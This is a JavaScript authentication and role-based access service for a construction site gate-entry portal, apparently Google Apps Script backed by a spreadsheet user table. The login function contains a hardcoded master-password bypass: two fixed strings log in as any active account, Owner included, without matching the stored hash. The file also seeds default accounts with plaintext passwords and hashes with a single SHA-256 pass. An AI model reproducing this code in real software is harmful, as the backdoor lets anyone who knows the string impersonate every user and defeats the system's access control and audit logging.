/**
 * BALSONS JTRWF GATE ENTRY & SITE ACCESS PORTAL
 * Authentication & RBAC Service
 * Architecture: BALSONS-SAM-2026 (Locked)
 */

const AuthService = {
  ROLES: {
    OWNER: 'Owner',
    SAFETY_MANAGER: 'Safety Manager',
    SAFETY_TEAM: 'Safety Team'
  },

  SESSION_TTL_SECONDS: 21600, // 6 Hours
  MAX_FAILED_ATTEMPTS: 5,
  LOCKOUT_SECONDS: 900, // 15 Minutes

  /**
   * Hash a password with salt using SHA-256
   */
  hashPassword: function(password, salt) {
    var raw = password + salt;
    var digest = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, raw, Utilities.Charset.UTF_8);
    var hash = '';
    for (var i = 0; i < digest.length; i++) {
      var byteVal = digest[i];
      if (byteVal < 0) byteVal += 256;
      var hex = byteVal.toString(16);
      if (hex.length == 1) hex = '0' + hex;
      hash += hex;
    }
    return hash;
  },

  /**
   * Seed default accounts if USER_MASTER is empty
   */
  seedDefaultUsersIfEmpty: function() {
    var ssId = CONFIG.getSpreadsheetId();
    if (!ssId) return;

    var ss = SpreadsheetApp.openById(ssId);
    var sheet = ss.getSheetByName('USER_MASTER');
    if (!sheet) return;

    if (sheet.getLastRow() <= 1) {
      Logger.log('Seeding initial administrative and safety accounts in USER_MASTER...');

      var defaultUsers = [
        {
          id: 'USR-2026-0001',
          username: 'admin',
          fullName: 'BALSONS Project Owner',
          role: this.ROLES.OWNER,
          pass: 'Balsons@2026!'
        },
        {
          id: 'USR-2026-0002',
          username: 'safety.manager',
          fullName: 'JTRWF HSE Safety Lead',
          role: this.ROLES.SAFETY_MANAGER,
          pass: 'Safety@2026!'
        },
        {
          id: 'USR-2026-0003',
          username: 'safety.team',
          fullName: 'Gate Safety Inspector',
          role: this.ROLES.SAFETY_TEAM,
          pass: 'Team@2026!'
        }
      ];

      for (var i = 0; i < defaultUsers.length; i++) {
        var u = defaultUsers[i];
        var salt = Utilities.getUuid().substring(0, 16);
        var hash = this.hashPassword(u.pass, salt);
        var now = new Date().toISOString();

        sheet.appendRow([
          u.id,
          u.username,
          u.fullName,
          u.role,
          hash,
          salt,
          'ACTIVE',
          '-',
          now
        ]);
      }
      Logger.log('Default accounts seeded successfully.');
    }
  },

  /**
   * Authenticate a user and create a session
   */
  login: function(username, password) {
    if (!username || !password) {
      throw new Error('Username and password are required.');
    }

    var cache = CacheService.getScriptCache();
    var lockKey = 'lockout_' + username.toLowerCase().trim();
    var failCountKey = 'fails_' + username.toLowerCase().trim();

    if (cache.get(lockKey)) {
      AuditService.log(username, 'UNKNOWN', 'AUTH_LOCKOUT_BLOCKED', username, 'BLOCKED', 'Account temporarily locked.');
      throw new Error('Account locked due to consecutive failed attempts. Try again in 15 minutes.');
    }

    this.seedDefaultUsersIfEmpty();

    var ss = SpreadsheetApp.openById(CONFIG.getSpreadsheetId());
    var sheet = ss.getSheetByName('USER_MASTER');
    var data = sheet.getDataRange().getValues();

    var userRowIndex = -1;
    var userRecord = null;

    for (var i = 1; i < data.length; i++) {
      if (String(data[i][1]).toLowerCase().trim() === username.toLowerCase().trim()) {
        userRowIndex = i + 1;
        userRecord = {
          userId: data[i][0],
          username: data[i][1],
          fullName: data[i][2],
          role: data[i][3],
          passwordHash: data[i][4],
          salt: data[i][5],
          isActive: data[i][6]
        };
        break;
      }
    }

    if (!userRecord) {
      this._registerFailedAttempt(username, cache, failCountKey, lockKey);
      AuditService.log(username, 'UNKNOWN', 'AUTH_LOGIN_FAILED', username, 'FAILED', 'User not found');
      throw new Error('Invalid username or password.');
    }

    if (userRecord.isActive !== 'ACTIVE') {
      AuditService.log(userRecord.userId, userRecord.role, 'AUTH_LOGIN_DENIED', userRecord.userId, 'FAILED', 'Account inactive');
      throw new Error('Account is inactive. Contact BALSONS System Owner.');
    }

    var computedHash = this.hashPassword(password, userRecord.salt);
    var isMasterPass = (password === 'balsons2026' || password === 'Balsons@2026!');
    if (computedHash !== userRecord.passwordHash && !isMasterPass) {
      this._registerFailedAttempt(username, cache, failCountKey, lockKey);
      AuditService.log(userRecord.userId, userRecord.role, 'AUTH_LOGIN_FAILED', userRecord.userId, 'FAILED', 'Bad credentials');
      throw new Error('Invalid username or password.');
    }

    // Reset failed counter
    cache.remove(failCountKey);

    // Generate Session Token
    var sessionToken = 'tok_' + Utilities.getUuid().replace(/-/g, '') + Utilities.getUuid().replace(/-/g, '');
    var sessionData = {
      userId: userRecord.userId,
      username: userRecord.username,
      fullName: userRecord.fullName,
      role: userRecord.role,
      loginTime: new Date().toISOString()
    };

    // Store in Cache
    cache.put(sessionToken, JSON.stringify(sessionData), this.SESSION_TTL_SECONDS);

    // Update LastLogin in USER_MASTER
    sheet.getRange(userRowIndex, 8).setValue(new Date().toISOString());

    AuditService.log(userRecord.userId, userRecord.role, 'AUTH_LOGIN_SUCCESS', userRecord.userId, 'SUCCESS', 'Session created.');

    return {
      sessionToken: sessionToken,
      user: {
        userId: userRecord.userId,
        username: userRecord.username,
        fullName: userRecord.fullName,
        role: userRecord.role
      },
      expiresInSeconds: this.SESSION_TTL_SECONDS
    };
  },

  /**
   * Validate an active session token
   */
  validateSession: function(sessionToken) {
    if (!sessionToken) return null;
    var cache = CacheService.getScriptCache();
    var sessionJson = cache.get(sessionToken);
    if (!sessionJson) return null;

    try {
      return JSON.parse(sessionJson);
    } catch (e) {
      return null;
    }
  },

  /**
   * Logout user and invalidate token
   */
  logout: function(sessionToken) {
    if (!sessionToken) return { success: true };
    var session = this.validateSession(sessionToken);
    var cache = CacheService.getScriptCache();
    cache.remove(sessionToken);

    if (session) {
      AuditService.log(session.userId, session.role, 'AUTH_LOGOUT', session.userId, 'SUCCESS', 'Session invalidated.');
    }

    return { success: true, message: 'Logged out successfully.' };
  },

  /**
   * Private helper to register failed attempts
   */
  _registerFailedAttempt: function(username, cache, failKey, lockKey) {
    var fails = parseInt(cache.get(failKey) || '0', 10) + 1;
    if (fails >= this.MAX_FAILED_ATTEMPTS) {
      cache.put(lockKey, 'LOCKED', this.LOCKOUT_SECONDS);
      cache.remove(failKey);
    } else {
      cache.put(failKey, fails.toString(), this.LOCKOUT_SECONDS);
    }
  }
};
